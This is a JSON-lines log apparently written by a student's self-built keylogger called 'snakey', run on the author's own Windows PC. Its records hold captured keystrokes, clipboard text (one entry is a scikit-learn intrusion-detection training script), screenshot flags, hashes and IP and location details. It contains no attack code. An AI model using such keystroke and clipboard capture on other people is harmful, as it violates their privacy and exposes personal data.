{"timestamp": "2025-05-06T23:53:11.764172", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "python keylogger.py\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "clipboard_hash": "97a5d08d563a74e6c9f75ef7db0d37545a9169e73346973effacc6deec5632e3", "screenshot_hash": "2cb3543f0e6a3a7432c15e6054ae7fc566ecae3b6f0f5fc538f300b5ae79eadf", "log_hash": "a298ab8631b6349ed1c0a3e3fcf25479383c0f71599d36004183d1a1273fd418"}
{"timestamp": "2025-05-06T23:53:39.805471", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "python keylogger.py\r\n", "keystrokes": "remnits workingi think", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "clipboard_hash": "97a5d08d563a74e6c9f75ef7db0d37545a9169e73346973effacc6deec5632e3", "screenshot_hash": "45476a46d43299fac9caf525d687dbc416217a95383a63a5fbc61c31195da47e", "log_hash": "2adaf55fcc6ed738c5e073e3751f638312337662ed27e034f04e5b325cd1924d"}
{"timestamp": "2025-05-06T23:54:05.778650", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "python keylogger.py\r\n", "keystrokes": "sunk deeper than pyke", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "clipboard_hash": "97a5d08d563a74e6c9f75ef7db0d37545a9169e73346973effacc6deec5632e3", "screenshot_hash": "267c0b2b5ef4850f9d7dd921ff8827ceb84e7538dbc62358223ba6826a8bdd75", "log_hash": "b79f52abb9d6692cc783fb42da0eec33925b1335b3029138e9b05d5321219dfe"}
{"timestamp": "2025-05-06T23:54:32.031089", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "python keylogger.py\r\n", "keystrokes": "stop_sbanakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "clipboard_hash": "97a5d08d563a74e6c9f75ef7db0d37545a9169e73346973effacc6deec5632e3", "screenshot_hash": "f7f096bf6705e8ef3814ccdcb58c7f7da6b1eb16b24630d0c0c710eb7382c63d", "log_hash": "5f0751b9f4fec4d39bd29e23a754f00a28ec4673ab136c5f76fe2fadcdd3ae23"}
{"timestamp": "2025-05-07T11:52:57.357660", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "yess, este j\u00b4a fiz", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "2ffd589974c4eb2673e51b3b5a3024288bd652c75c44fde54df813484a7f5408", "log_hash": "aed7ed0c3ccd02ab8e21ea6b3805da98b8250359192287b69430b2395d3ca41b"}
{"timestamp": "2025-05-07T11:53:23.819867", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "t\u00b4a a ir bemestou a trabalhar no meu keylogger para proijec", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "2a94bed13d8c9a64df3c638b149c79773bc24864e701c0ebaec18e58dacc880e", "log_hash": "bf896a1fa2a21f8bfbe29848547a300c46a7092b98e0fc79a25cd141bff10ac9"}
{"timestamp": "2025-05-07T11:53:49.954229", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "stop_snakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "23a0192cd321e88468877b7a4485c39b5588a44a4675360c422d3c421fcd54f5", "log_hash": "3d46447dd6f9ca0f92d3dcc197bf6579f02b876586bd3660ef673bd4c3c1c184"}
{"timestamp": "2025-05-07T13:31:19.748559", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "# ML/train_snakey_model.py\r\nimport pandas as pd\r\nimport os\r\nfrom sklearn.ensemble import RandomForestClassifier\r\nfrom sklearn.model_selection import train_test_split\r\nfrom sklearn.metrics import classification_report\r\nfrom sklearn.preprocessing import LabelEncoder\r\nimport joblib\r\n\r\n# Folder with the CICD CSV files\r\nfolder_path = os.path.join(\"..\", \"CICD\")\r\n\r\n# Load all CSV files\r\ndataframes = []\r\nfor filename in os.listdir(folder_path):\r\n    if filename.endswith(\".csv\"):\r\n        file_path = os.path.join(folder_path, filename)\r\n        print(f\"\ud83d\udd04 Loading {filename}\")\r\n        df = pd.read_csv(file_path, low_memory=False)\r\n        df.replace([float('inf'), -float('inf')], pd.NA, inplace=True)\r\n        df.dropna(inplace=True)\r\n        if 'Label' in df.columns:\r\n            dataframes.append(df)\r\n\r\n# Combine them all into a single dataframe\r\ndf = pd.concat(dataframes, ignore_index=True)\r\nprint(f\"\u2705 Loaded {len(df)} total rows from {len(dataframes)} files\")\r\n\r\n# Encode the label\r\nle = LabelEncoder()\r\ndf['Label'] = le.fit_transform(df['Label'])\r\n\r\n# Split features and target\r\nX = df.drop(columns=['Label'], errors='ignore')\r\ny = df['Label']\r\n\r\n# Train/test split\r\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2, random_state=42)\r\n\r\n# Train Random Forest model\r\nmodel = RandomForestClassifier(n_estimators=100, random_state=42)\r\nmodel.fit(X_train, y_train)\r\n\r\n# Evaluate\r\npredictions = model.predict(X_test)\r\nprint(classification_report(y_test, predictions, zero_division=0))\r\n\r\n# Save model\r\njoblib.dump(model, 'snakey_model.joblib')\r\nprint(\"\u2705 Model saved as snakey_model.joblib\")\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "clipboard_hash": "4c4dc0456e78b73060b665f58c62e7e758755815cf45fec24f3c5c6f62260a6d", "screenshot_hash": "753e32e03f6279c9a81984296e622f738d6ace1b50f144e33ceb07307a69700b", "log_hash": "c8162dabc3bf1308dd592fde45b3fa1e0eedf2a9f00384603ec775eb8bb9bbc8"}
{"timestamp": "2025-05-08T13:22:39.203926", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "aa943c39e46006b61d7222f608cff131559980ea25335750f391ae42e53e72f3", "log_hash": "e6a0d40f913d2d5fb371b26f172cb19147135a631f379a8ed716c0dc969ce38b"}
{"timestamp": "2025-05-08T13:23:05.695374", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "29f4f1601bcfb3dcaa5c75caae986bea12a78c3c8ec0c5421ed04dd397faa7ee", "log_hash": "8fe8ea36ad440fd41415d77873e2702f89b6fe5e17cb79f5ad7298cf07a20156"}
{"timestamp": "2025-05-08T13:23:31.971267", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "c3963aa5a14ecf94d0ccfd36759dfaa228533757b1f05fbeff06d90c3d4dd404", "log_hash": "ba55d53f930816770babb088f29f23f200279f3a6dd94b852b4dd57b8f39d99f"}
{"timestamp": "2025-05-08T13:23:58.029924", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "c445538a64da4248894a340c03ee689d4724c5098fbdb00e29ea0ebce7df5361", "log_hash": "095659595701cf45e6373e70237661c28fd8a0cb65de639974b78c1949fd14e2"}
{"timestamp": "2025-05-08T13:24:24.897287", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "90c6e7a5fedefec3bd01dc8bcb7ee4e76e34704824194d582082b211e556f1ce", "log_hash": "7d5b02ae96385c8094a77557c132c6679ef480d872b12823c76e06db0698c2fe"}
{"timestamp": "2025-05-08T13:24:51.302397", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "68f15cc558054f83d04d467865cce5643d8a486511641fb40dd12746585e73fa", "log_hash": "e7c0813c416e106e638e20e23321a92b1e26c4c2f2945f1ddb7435082c87093c"}
{"timestamp": "2025-05-08T13:25:17.444634", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "stop_snakeuy", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "bd3dfcbf51a5af8095bf3c87879d63f73f02fb55815cc2e638fbfc23c70261d6", "log_hash": "e289a5b2d1e01388ab116dd7c60b2f7cceededdabb82160ce806f3e2e984f3d6"}
{"timestamp": "2025-05-09T13:41:36.583191", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "snakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "348f9449ed77fc8cfc53fb448287c2bbf313cd39868c2bb129ea39fea1d29249", "log_hash": "fae64383fd7540ecc04f41ff97c36aa453fbb0b3a0fd4f0fec647cc8d6b963e7"}
{"timestamp": "2025-05-10T10:48:12.418118", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "stop_s", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "a364d81a5370dba9258fd3b905db85ae18d265142bfa51a88cb12f6d427a20c0", "log_hash": "103af5a12ee4773a0869e032afe18238b09f68816f1864211779794d32b39915"}
{"timestamp": "2025-05-11T10:46:14.812465", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "9d0b7517824b01d18cbd12955b220e745999a0420b06f16e9837a2da5e45029d", "log_hash": "4978d29a0a02d1ad724533d2b2d341b1ee5294a3fc22dfa9670fe33866931db1"}
{"timestamp": "2025-05-11T10:46:41.374630", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "b5b5f1986a53d5def321e7bb93b5fad44e45670ee887b670c4d6f691eb6505ca", "log_hash": "8f397e4acfd900f0c10c8a2d5d2cad4ad3a84316ada8d4184709f282babc6835"}
{"timestamp": "2025-05-11T10:47:07.535082", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "15bbac5edf01c59eda6e9f3ba1a5c66dc35634e40e5fb5ce2b88ce4f6e87e8aa", "log_hash": "b2035dd90ff6b589f3732a97971d7b6afb2cf50036e62f992048417b85087aba"}
{"timestamp": "2025-05-11T10:47:33.886231", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "75574d5d8daa1dc9d64a701bfb58e37205fb4fcf32b6fab775ba932e3b313dc6", "log_hash": "28bdc9f4c9e4e3164acae361c798b1048f0bf90c8f0079986924e77cb498e85b"}
{"timestamp": "2025-05-11T10:48:00.138100", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "588da890175a1b842884231ec86fdbcb91c7579a94f4102368445ade722395ab", "log_hash": "93384f4937b6b3543b60c4217eededf379e6151231406b2cfdd4d8b752db8cfc"}
{"timestamp": "2025-05-11T10:48:26.610485", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "0f028bbfe09e661b8056f479a67d5d0384f7189556bc5142699f00fe17493176", "log_hash": "d8b0cb3ff52ddb753595e43b3196be9af8468a6a0da68cc472eed2ec6f8b10e8"}
{"timestamp": "2025-05-11T10:48:52.868712", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "9300d553e3a64c27bcb5df888d15d5a04a4df7fdf96af19a251cb558750c28fc", "log_hash": "2dc7c60d7d56352829df66cb1a5ae3de34864583b96ed6fb8fed85790bc19116"}
{"timestamp": "2025-05-11T10:49:19.235218", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "0f01de389b065d8dfe9c9f7c373c680e085166335d7b98a9a50d69486a25406a", "log_hash": "56e02626266402408307fb8e37042c00731c0b7261d571ae783e2416fa82f276"}
{"timestamp": "2025-05-11T10:49:45.508741", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "05257f50f2e17b10c81f3753469ecea1bdeb37f0d151878b53c0e0da9b798250", "log_hash": "274dc58dde6986d0610d054a5e60234053ba685e089ed5f90cff3ad8b0a73c25"}
{"timestamp": "2025-05-11T10:50:11.750774", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "d43c7f272d9225594e98bb00415aa7872a685168d64e5afc1087b3b6398ad851", "log_hash": "eaccbfc82789a6d8ce5f174c9c82aa1d92f1d85b1b61e8e7ccf6f63e82bb3065"}
{"timestamp": "2025-05-11T10:50:38.116639", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "84aff3e0cf2259dae9aa79257c78bbab02a01343f2998b4e8d7f8b3eed5da39d", "log_hash": "c496cb4586a4c28ba201a94aa8eb6b4eada234d4dbc34ebe8d06205071409d48"}
{"timestamp": "2025-05-11T10:51:04.397765", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "c877e499ee8abccac24cdf13b7a59e1f9d54aea2beb93fe6be5e524ab871f2b2", "log_hash": "e7eb30258b7eaaa5ee053dd09b409486c8b06a1e0d64284a831da1eacaa997c8"}
{"timestamp": "2025-05-11T10:51:30.553440", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "stop_snakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "c2c9c4ebd183a453eb1c017d4bb6afa8c7e8d7ab8c758a14c1bd27a6a5bbfc90", "log_hash": "aa399346dedb1dea915f626d7a1f7fc4415b76d66e138332e847c46d36220ed9"}
{"timestamp": "2025-05-12T10:29:03.460719", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "83457abeb45bd482525f59732c008acccf8576d8575c2d922266cb94a2cffd16", "log_hash": "9e430e40eec1f149fab1095b73e03692e2b077679b8f3b501bc57e647b2c848a"}
{"timestamp": "2025-05-12T10:29:31.862109", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "328b9143640e993a518c1b246ddb4f4624c7325d5cef18dacc24fe7f2f4f4beb", "log_hash": "c371e5b935cee7c896da0990a128543be22bff17e77c57ecda44550fde2779cb"}
{"timestamp": "2025-05-12T10:29:58.553334", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "bbc43628a3594626ba9e74e6536e4f7b240aa5baf1cb66ab93a31d0996d048ec", "log_hash": "702fb856d11fa718235c82632f4374cdaccf361da667e58e05d361505a767095"}
{"timestamp": "2025-05-12T10:30:24.900219", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "be332a2b8264d2650c13e522bd93bf58e8c6bf1fa1fc1d3c17f45c2e9982fe63", "log_hash": "ec65a1bc0e38da263143e886f9444a5dde52cf2f0ef8b6a21f1ff6d15d484514"}
{"timestamp": "2025-05-12T10:30:51.540796", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "3b30736cdf09409e20c094f1c79570ef8c9ea2b9a70ed7fe28a9f2c5c5293c78", "log_hash": "feb672f34c3aa05c7b6cdec13198bf3378bc32d8c846ff43f07900f8f9b33877"}
{"timestamp": "2025-05-12T10:31:18.151441", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "101d83882969dda05c873e9b513c2d3dd756cf3dcf6a10c3a1b5f4c6e5bdb298", "log_hash": "69848d646c7163f3060228c8952a58d13d43c297fb009903b67ddcdec738f67e"}
{"timestamp": "2025-05-12T10:31:44.709506", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2.83.128.150", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "Clipboard is empty.", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "clipboard_hash": "c295a53012ad21f6f795989a06a69c601c1d2b19f16285226e4f8b1d2cf2e087", "screenshot_hash": "9b33162d609a22768e7db8936495ec2821a3c3d7f343481f004ff7dd66ce934b", "log_hash": "51492cc1e483f6e67d59a555b62d12badbccb903adb70445396a1cad6800b87e"}
